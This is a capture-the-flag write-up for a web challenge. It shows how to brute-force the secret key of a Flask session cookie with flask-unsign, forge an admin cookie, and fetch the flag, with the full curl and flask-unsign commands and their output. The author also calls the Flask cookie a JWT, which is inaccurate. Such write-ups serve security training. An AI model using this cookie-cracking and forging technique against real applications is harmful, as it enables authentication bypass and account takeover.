# Genshin Code

**Challenge Category: Web** <br />
**Challenge Points: 500**

## Challenge Description

Bro said I can get 500 free rolls if I can log in to the administrator accounts. But I need to make sure my log in cookie is correct first...

`genshin.nypinfosec.com`

## Analysis

### 1. Login Form

Sending a GET request to the domain presents us a normal login form, with attributes `action="/login"` and `method="POST"`.

```sh
$ curl https://genshin.nypinfosec.com
```

```html
<form id="sign-up-form" action="/login" method="POST">
  <div class="form-group my-3">
    <label for="email">Username</label>
    <input
      type="text"
      class="form-control"
      name="username"
      placeholder="Enter Username"
    />
  </div>
  <div class="form-group my-3">
    <label for="password">Password</label>
    <input
      type="password"
      class="form-control"
      name="password"
      placeholder="Password"
    />
  </div>
  <div class="button-container">
    <button type="submit">Log In</button>
  </div>
</form>
```

### 2. Send Random Login Credentials

Since we know the login endpoint is at `/login`, we can attempt to login using a random `username` and `password` combination to see what we get.

```sh
$ curl -s -X POST -d "username=nyp&password=ctf" https://genshin.nypinfosec.com/login
```

```html
<!DOCTYPE html>
<html lang="en">
  <title>Redirecting...</title>
  <h1>Redirecting...</h1>
  <p>
    You should be redirected automatically to the target URL:
    <a href="/flag">/flag</a>. If not, click the link.
  </p>
</html>
```

This doesn't look right. No way did we supply some random `username` and `password` and we get logged in.

In the challenge description, they hinted something to do with cookies. Let's check the headers received.

```sh
$ curl -s -X POST -d "username=nyp&password=ctf" https://genshin.nypinfosec.com/login -v
```

```diff
  *   Trying 172.67.146.217:443...
  * Connected to genshin.nypinfosec.com (172.67.146.217) port 443 (#0)
  ...[truncated]...
  > POST /login HTTP/2
  > Host: genshin.nypinfosec.com
  > user-agent: curl/7.88.1
  > accept: */*
  > content-length: 25
  > content-type: application/x-www-form-urlencoded
  >
  ...[truncated]...
  < HTTP/2 302
  < date: Sun, 24 Dec 2023 15:21:30 GMT
  < content-type: text/html; charset=utf-8
  < location: /flag
  < vary: Cookie
+ < set-cookie: mihoyo_admin=eyJsb2dnZWRfaW4iOmZhbHNlfQ.ZYhMeg.gkzUDUfnJ_8YT7OXeqL-iKg1Q2I; HttpOnly; Path=/
  ...[truncated]...
  <
  <!DOCTYPE html>
  <html lang="en">
    <title>Redirecting...</title>
    <h1>Redirecting...</h1>
    <p>
      You should be redirected automatically to the target URL:
      <a href="/flag">/flag</a>. If not, click the link.
    </p>
  </html>
  * Connection #0 to host genshin.nypinfosec.com left intact
```

As hinted, a cookie was set in the response.

### 3. The `/flag` Endpoint

We'll use the cookie from before and try the `/flag` endpoint as redirected now.

```sh
$ curl -s --cookie "mihoyo_admin=eyJsb2dnZWRfaW4iOmZhbHNlfQ.ZYhMeg.gkzUDUfnJ_8YT7OXeqL-iKg1Q2I" https://genshin.nypinfosec.com/flag
```

```html
<!DOCTYPE html>
<html lang="en">
  <title>403 Forbidden</title>
  <h1>Forbidden</h1>
  <p>
    You don&#39;t have the permission to access the requested resource. It is
    either read-protected or not readable by the server.
  </p>
  * Connection #0 to host genshin.nypinfosec.com left intact
</html>
```

As expected, the cookie issued from the server does not work.

### 4. The Cookie Issued

The cookie issued by the server resembles much of a JWT token. We can try to decode it and see what is inside.

![JWT Decode](../.files/web_genshin_code_1.png "JWT Decode")

We definitely get something back. But, this token doesn't seem up-to-spec with [RFC 7519](https://datatracker.ietf.org/doc/html/rfc7519) because the payload is in the header, and there is no header to begin with.

```diff
### DECODED HEADER ###
+ Expected: {"typ":"jwt","alg":"HS256"}
- Decoded:  {"logged_in":false}

### DECODED PAYLOAD ###
+ Expected: {"logged_in":false}
- Decoded:  "e�Dv"
```

## Solution

1. We know that we must authenticate via a JWT token.
2. We know that the JWT token supplied is out-of-spec and can't be manipulated without the right tools. Let's install the right tools for the job.

```sh
pip3 install flask-unsign flask-unsign[wordlist]
```

3. Decrypt the issued JWT token using bruteforce

```sh
$ flask-unsign --unsign --cookie "eyJsb2dnZWRfaW4iOmZhbHNlfQ.ZYhMeg.gkzUDUfnJ_8YT7OXeqL-iKg1Q2I" --wordlist flask_unsign_wordlist/wordlists/all.txt
```

```
[*] Session decodes to: {'logged_in': False}
[*] Starting brute-forcer with 8 threads..
[*] Attempted (2432): -----BEGIN PRIVATE KEY--------
[+] Found secret key after 19584 attemptsyyew6kIByris
'password'
```

4. Change the `logged_in` field to `True` and sign the new JWT token with the same key.

```sh
$ flask-unsign --sign --cookie "{'logged_in':True}" --secret password
```

```
eyJsb2dnZWRfaW4iOnRydWV9.ZYhT-Q.vysFmPznT24skoxe8B7ptQvd33M
```

5. Use the manipulated JWT token in the request back to the server

```sh
$ curl -s --cookie "mihoyo_admin=eyJsb2dnZWRfaW4iOnRydWV9.ZYhT-Q.vysFmPznT24skoxe8B7ptQvd33M" https://genshin.nypinfosec.com/flag | html2text -
```

```
       Damn You Are This Good...     "NYP{fL@sK_s3ss1On    _m@N1pulAT10N}"
```

We found the flag. Let's cleanup the output a little.

```sh
$ curl -s --cookie "mihoyo_admin=eyJsb2dnZWRfaW4iOnRydWV9.ZYhT-Q.vysFmPznT24skoxe8B7ptQvd33M" https://genshin.nypinfosec.com/flag | html2text - | tr -d " " | grep -o "NYP{.*}"
```

```
NYP{fL@sK_s3ss1On_m@N1pulAT10N}
```

## Final Remarks

Although this challenge was pretty straightforward, breaking spec [RFC 7519](https://datatracker.ietf.org/doc/html/rfc7519) made the challenge almost undoable unless there was a hint to Flask's own implementation of JWT, with mentions that it is out-of-spec.
